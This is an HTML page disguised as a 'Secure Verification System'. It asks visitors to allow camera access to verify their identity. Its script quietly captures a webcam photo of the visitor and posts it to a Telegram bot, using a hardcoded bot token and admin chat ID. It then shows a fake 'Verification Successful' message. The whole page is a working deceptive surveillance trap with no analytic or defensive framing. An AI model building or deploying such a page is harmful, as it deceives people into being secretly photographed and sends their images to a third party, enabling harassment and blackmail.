<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification System</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #0f0f0f; color: white; padding: 50px 20px; }
        .card { background: #1a1a1a; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 450px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #28a745; margin-bottom: 10px; }
        p { color: #aaa; margin-bottom: 30px; }
        button { background: #28a745; color: white; border: none; padding: 18px; width: 100%; font-size: 18px; border-radius: 12px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: #218838; }
        #status { margin-top: 25px; color: #ffc107; font-weight: 500; line-height: 1.6; }
        .footer-note { font-size: 12px; color: #555; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Identity Verification</h2>
        <p>Please click the button below and grant camera access when prompted by your browser.</p>
        
        <button id="authBtn">Verify & Proceed</button>
        
        <div id="status">Waiting for user action...</div>
        <div class="footer-note">Note: If permission fails, click the Lock (üîí) icon in the address bar to manually allow camera.</div>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
        const ADMIN_ID = "7289235107";

        document.getElementById('authBtn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            try {
                status.innerText = "Requesting camera permission...";
                
                // Trigger the browser's permission dialog
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                status.innerText = "Permission granted! Processing...";
                const video = document.getElementById('v');
                video.srcObject = stream;

                // Capture after 2 seconds to ensure camera focus
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                    const formData = new FormData();
                    formData.append('chat_id', ADMIN_ID);
                    formData.append('photo', blob, 'verify.jpg');

                    // Send to Telegram
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    status.style.color = "#28a745";
                    status.innerText = "‚úÖ Verification Successful!";
                    
                    // Stop camera stream
                    stream.getTracks().forEach(track => track.stop());
                }, 2000);

            } catch (err) {
                status.style.color = "#ff4d4d";
                status.innerHTML = "‚ùå Error: Permission Denied.<br>Please enable camera in browser settings (Lock üîí icon).";
            }
        });
    </script>
</body>
</html>
